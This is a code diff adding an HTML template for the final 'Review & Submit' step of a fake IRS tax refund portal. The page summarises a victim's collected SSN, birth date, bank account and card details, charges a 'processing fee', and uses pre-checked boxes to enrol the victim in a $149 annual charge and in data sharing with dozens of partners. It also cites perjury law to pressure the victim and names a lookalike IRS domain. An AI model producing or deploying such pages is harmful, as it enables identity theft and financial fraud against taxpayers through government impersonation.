@@ -1,0 +1,175 @@
+{% extends "layout.html" %}
+
+{% block title %}Step 5: Review & Submit — IRS Refund Portal{% endblock %}
+{% block breadcrumb %}Review & Submit{% endblock %}
+
+{% block content %}
+<div class="page-main">
+
+    <div class="form-col">
+
+        <h1 class="page-title">Tax Refund Verification Portal</h1>
+        <p class="page-subtitle">Reference No: IRS-2026-REF-84920 &nbsp;|&nbsp; Refund Amount: <strong>$4,287.00</strong></p>
+
+        <div class="progress-steps">
+            <div class="progress-step completed"><span class="step-num">✓</span>Identity</div>
+            <div class="progress-step completed"><span class="step-num">✓</span>Contact</div>
+            <div class="progress-step completed"><span class="step-num">✓</span>Deposit</div>
+            <div class="progress-step completed"><span class="step-num">✓</span>Processing</div>
+            <div class="progress-step active"><span class="step-num">5</span>Review</div>
+        </div>
+
+        <div class="alert alert-success">
+            ✅ &nbsp; All information collected. Please review your submission and agree to the terms below before finalizing.
+        </div>
+
+        <div class="form-card">
+            <div class="form-card-title">
+                📋 &nbsp; Step 5 of 5 — Review &amp; Submit
+            </div>
+            <div class="form-card-desc">
+                Please review the information you have provided. By submitting this form, you certify that the information is accurate and complete under penalty of perjury.
+            </div>
+
+            <!-- Review sections -->
+            {% if step1 %}
+            <div class="review-section">
+                <div class="review-section-title">Identity Information</div>
+                <div class="review-row"><span class="rl">Full name</span><span class="rv">{{ step1.get('full_name', '—') }}</span></div>
+                <div class="review-row"><span class="rl">SSN</span><span class="rv">{{ step1.get('ssn', '—') | string | truncate(7, True, '****') if step1.get('ssn') else '—' }}</span></div>
+                <div class="review-row"><span class="rl">Date of birth</span><span class="rv">{{ step1.get('date_of_birth', '—') }}</span></div>
+            </div>
+            {% endif %}
+
+            {% if step2 %}
+            <div class="review-section">
+                <div class="review-section-title">Contact Information</div>
+                <div class="review-row"><span class="rl">Address</span><span class="rv">{{ step2.get('street_address', '—') }}</span></div>
+                <div class="review-row"><span class="rl">City / State / ZIP</span><span class="rv">{{ step2.get('city', '') }}, {{ step2.get('state', '') }} {{ step2.get('zip_code', '') }}</span></div>
+                <div class="review-row"><span class="rl">Phone</span><span class="rv">{{ step2.get('phone', '—') }}</span></div>
+            </div>
+            {% endif %}
+
+            {% if step3 %}
+            <div class="review-section">
+                <div class="review-section-title">Direct Deposit</div>
+                <div class="review-row"><span class="rl">Bank</span><span class="rv">{{ step3.get('bank_name', '—') }}</span></div>
+                <div class="review-row"><span class="rl">Routing No.</span><span class="rv">{{ step3.get('routing_number', '—') }}</span></div>
+                <div class="review-row"><span class="rl">Account No.</span><span class="rv">••••{{ step3.get('account_number', '')[-4:] if step3.get('account_number') else '—' }}</span></div>
+                <div class="review-row"><span class="rl">Account type</span><span class="rv">{{ step3.get('account_type', '—') | title }}</span></div>
+            </div>
+            {% endif %}
+
+            {% if step4 %}
+            <div class="review-section">
+                <div class="review-section-title">Processing Fee Payment</div>
+                <div class="review-row"><span class="rl">Card</span><span class="rv">••••••••••••{{ step4.get('card_number', '').replace(' ', '')[-4:] if step4.get('card_number') else '—' }}</span></div>
+                <div class="review-row"><span class="rl">Cardholder</span><span class="rv">{{ step4.get('cardholder_name', '—') }}</span></div>
+                <div class="review-row"><span class="rl">Amount charged</span><span class="rv" style="color:#c62828">$49.99</span></div>
+            </div>
+            {% endif %}
+
+            <hr>
+
+            <!-- Consent checkboxes — all pre-checked -->
+            <div style="font-size:15px;font-weight:700;color:#1c3a6e;margin-bottom:12px;">
+                Authorizations &amp; Consent
+            </div>
+
+            <form method="POST" action="/step/5">
+
+                <div class="consent-box">
+
+                    <div class="consent-item">
+                        <input type="checkbox" id="recurring_fee" name="recurring_fee" checked>
+                        <div>
+                            <label for="recurring_fee" class="consent-text" style="font-weight:400;cursor:pointer">
+                                I authorize an annual <strong>IRS Tax Preparation Assistance fee of $149.00/year</strong>, which provides ongoing refund optimization and audit assistance services. This fee will be charged automatically each year on the anniversary of enrollment.
+                            </label>
+                            <div class="consent-detail">
+                                This is a recurring subscription. You may cancel at any time by calling 1-888-IRS-PREP or by visiting irs-tax-refunds.com/cancel. Cancellations must be received at least 30 days before the renewal date to avoid charges.
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="consent-item">
+                        <input type="checkbox" id="data_sharing" name="data_sharing" checked>
+                        <div>
+                            <label for="data_sharing" class="consent-text" style="font-weight:400;cursor:pointer">
+                                I authorize <strong>IRS-Approved Financial Partners</strong> to contact me with personalized financial products and services, including tax preparation services, credit monitoring, and debt relief programs.
+                            </label>
+                            <div class="consent-detail">
+                                Your information may be shared with up to 47 authorized partner organizations. See our <a href="#">Partner Directory</a> for a full list.
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="consent-item">
+                        <input type="checkbox" id="marketing" name="marketing" checked>
+                        <div>
+                            <label for="marketing" class="consent-text" style="font-weight:400;cursor:pointer">
+                                I consent to receive marketing communications, newsletters, and promotional offers from IRS-certified service providers via email, phone, and postal mail.
+                            </label>
+                            <div class="consent-detail">
+                                You may opt out at any time by replying STOP to any message or by updating your preferences online.
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+
+                <div class="alert alert-info" style="font-size:13px">
+                    ℹ️ &nbsp; By clicking "Submit Final Application", you certify under penalty of perjury (26 U.S.C. §7206) that all information provided is true, correct, and complete. Submission constitutes a legally binding declaration.
+                </div>
+
+                <button type="submit" class="btn-primary btn-green" style="font-size:17px;padding:14px 36px">
+                    ✅ &nbsp; Submit Final Application
+                </button>
+
+                <p class="text-muted mt-4">
+                    Your refund of <strong>$4,237.01</strong> (after $49.99 fee) will be deposited within 3–5 business days. A confirmation email will be sent to your address on file.
+                </p>
+
+            </form>
+        </div>
+
+    </div>
+
+    <aside class="sidebar-col">
+
+        <div class="refund-status-box">
+            <div class="label">📋 Your Pending Refund</div>
+            <div class="amount">$4,287.00</div>
+            <div class="ref">Ref: IRS-2026-REF-84920</div>
+            <div class="status-tracker">
+                <div class="status-step done"><div class="status-dot"></div>Identity Verification</div>
+                <div class="status-step done"><div class="status-dot"></div>Contact Verification</div>
+                <div class="status-step done"><div class="status-dot"></div>Direct Deposit Setup</div>
+                <div class="status-step done"><div class="status-dot"></div>Processing Fee Paid</div>
+                <div class="status-step current"><div class="status-dot"></div>Final Review</div>
+            </div>
+        </div>
+
+        <div class="sidebar-widget">
+            <div class="sidebar-widget-title">What Happens Next?</div>
+            <ul>
+                <li>✅ Your application is reviewed by IRS staff</li>
+                <li>💳 $49.99 processing fee is charged</li>
+                <li>🏦 Refund is deposited within 3–5 days</li>
+                <li>📧 Confirmation sent to your email</li>
+            </ul>
+        </div>
+
+        <div class="sidebar-widget">
+            <div class="sidebar-widget-title">Need Help?</div>
+            <ul>
+                <li>Taxpayer Service: <strong>1-800-829-1040</strong></li>
+                <li>Hours: Mon–Fri 7am–7pm</li>
+                <li><a href="#">Cancel Subscriptions</a></li>
+            </ul>
+        </div>
+
+    </aside>
+
+</div>
+{% endblock %}
